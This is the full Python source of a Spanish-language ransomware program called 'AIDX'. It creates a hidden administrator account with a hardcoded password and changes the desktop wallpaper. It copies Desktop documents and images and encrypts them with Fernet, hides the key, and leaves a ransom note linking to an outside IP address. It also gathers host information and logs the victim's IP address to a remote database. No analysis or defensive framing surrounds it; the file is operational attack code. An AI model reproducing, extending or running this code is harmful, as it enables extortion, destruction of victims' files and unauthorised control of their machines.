import os
import ctypes
import subprocess
import win32com.shell.shell as shell
from cryptography.fernet import Fernet
from PIL import Image
import win32api
import requests
import sys
import shutil
import mysql.connector
import datetime


from conec import Database
from escan import obtener_informacion_sistema
from utils import generar_key, cargar_key, encrypt, decrypt 

USERNAME = "root"
PASSWORD = "Ponce1337"
ADMIN_GROUP = "Administrators"
README_FILE = "readme.txt"


def patch_crypto_be_discovery():
    """
    Monkey patches cryptography's backend detection.
    Objective: support pyinstaller freezing.
    """
    from cryptography.hazmat import backends
    try:
        from cryptography.hazmat.backends.commoncrypto.backend import backend as be_cc
    except ImportError:
        be_cc = None
    try:
        from cryptography.hazmat.backends.openssl.backend import backend as be_ossl
    except ImportError:
        be_ossl = None
    backends._available_backends_list = [
        be for be in (be_cc, be_ossl) if be is not None
    ]



def create_superuser(username, password):
    command = f"net user {username} {password} /add"
    subprocess.check_call(command, shell=True)
    command = f"net localgroup administrators {username} /add"
    subprocess.check_call(command, shell=True)

    print(f"Super usuario '{username}' creado con éxito.")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def install_libraries():
    libraries = [
        "cryptography", "psutil", "wmi", "scapy", "pillow", "requests", "nmap", "pywin32", "socket", "winreg"
    ]

    for library in libraries:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        print(f"Se ha instalado la biblioteca: {library}")


def download_image(url, path):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(path, 'wb') as out_file:
            out_file.write(response.content)
    else:
        print(f"Error descargando imagen: {response.status_code}")


def set_wallpaper(path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)


def convert_to_bmp(path):
    image = Image.open(path)
    bmp_path = path.replace('.jpg', '.bmp')
    image.save(bmp_path, "BMP")
    return bmp_path


def encrypt_all(application_path):
    path_to_encrypt = os.path.join(application_path, "files")
    generar_key()
    key = cargar_key()

    # Crear la carpeta "files" en el escritorio si no existe
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    path_to_encrypt = os.path.join(desktop_path, "files")
    if not os.path.exists(path_to_encrypt):
        os.makedirs(path_to_encrypt)

    # Copiar la clave key.key al directorio de la carpeta "files"
    key_file_path = os.path.join(application_path, "key.key")
    destination_path = os.path.join(path_to_encrypt, "key.key")
    shutil.copy2(key_file_path, destination_path)

    # Establecer el atributo oculto del archivo
    FILE_ATTRIBUTE_HIDDEN = 0x02
    kernel32 = ctypes.WinDLL('kernel32')
    kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)

    # Obtener el directorio del escritorio
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Carpetas adicionales a incluir
    additional_folders = ["Archivos", "Documentos", "Videos", "Imágenes"]

    for root, directories, files in os.walk(desktop_path):
        # Excluir las carpetas adicionales
        directories[:] = [d for d in directories if d not in additional_folders]

        for file in files:
            # Verificar si el archivo es de Word o PDF
            if file.endswith((".doc", ".docx", ".pdf", ".ppt", ".jpg", ".png")):
                file_path = os.path.join(root, file)
                destination_path = os.path.join(path_to_encrypt, file)
                if not os.path.exists(destination_path):
                    shutil.copy2(file_path, destination_path)
                    encrypt([destination_path], key)

    with open(os.path.join(path_to_encrypt, README_FILE), 'w') as file:

        file.write(' AIDX RANSONWARE   - ENCRIPTE TUS ARCHIVOS \n')
        file.write(' DOCUMENTOS WORD -  ARCHIVOS PDF -  POWER POINT  - JPG  -  PNG \n\n')
        file.write('DESENCRIPTA TUS ARCHIVOS Y ELIMINA AIDX DE TU EQUIPO INGRESA AL SIGUIENTE LINK: \n  http://3.209.34.159/aidxweb/aidx.html  y pincha el boton azul ')
        file.write('  ')
    print("Archivos encriptados correctamente.")
    print("Archivo TXT escrito con éxito.")





def main():
    # Reubicando esta línea para hacerla más efectiva
    db = Database()

    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
        os.chdir(application_path)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
        
    #soporte para la congelacion del script --- ejecucion correcta del compilado
    patch_crypto_be_discovery()

    if len(sys.argv) > 1:
            if sys.argv[1].lower() == "enc":
                # Crear la carpeta "files" en el escritorio si no existe
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                path_to_encrypt = os.path.join(desktop_path, "files")
                if not os.path.exists(path_to_encrypt):
                    os.makedirs(path_to_encrypt)


                # Descargar y establecer el fondo de pantalla
                img_url = "https://imgur.com/PjyQi8U.jpg"  # URL de la imagen a descargar
                img_path = os.path.join(application_path, "wallpaper.jpg")  # Ruta donde se guardará la imagen
                download_image(img_url, img_path)  # Descargar la imagen
                img_path = convert_to_bmp(img_path)  # Convertir la imagen a .bmp
                set_wallpaper(img_path)  # Establecer la imagen como fondo de pantalla

                encrypt_all(application_path)
                print("Archivos encriptados y archivos TXT escritos con éxito.")
    
                # Ejecutar el proceso de información después de la encriptación
             
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                path_to_encrypt = os.path.join(desktop_path, "files")
                ruta_archivo_infectado = os.path.join(path_to_encrypt, "info_equipo_infectado.txt")
                informacion_sistema = obtener_informacion_sistema()
                            
                
                ruta_carpeta_files = os.path.join(os.path.expanduser("~"), "Desktop", "files")
                if not os.path.exists(ruta_carpeta_files):
                    os.makedirs(ruta_carpeta_files)


                # Generar el informe del equipo infectado
                with open(ruta_archivo_infectado, 'w') as archivo_infectado:
                    for clave, valor in informacion_sistema.items():
                        archivo_infectado.write(clave + ': ' + str(valor) + '\n')
                print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")
                ip_address = informacion_sistema['Dirección IP']
                db.insert_data(ip_address)
                
         
                    
                    
                    
                    
                    
                    
                    
            else:
                print("Argumento inválido. Uso: aidx.py [ enc / des]")
    else:
        print("Argumento inválido. Uso: aidx.py [ enc / des ]")

if __name__ == '__main__':
    main()


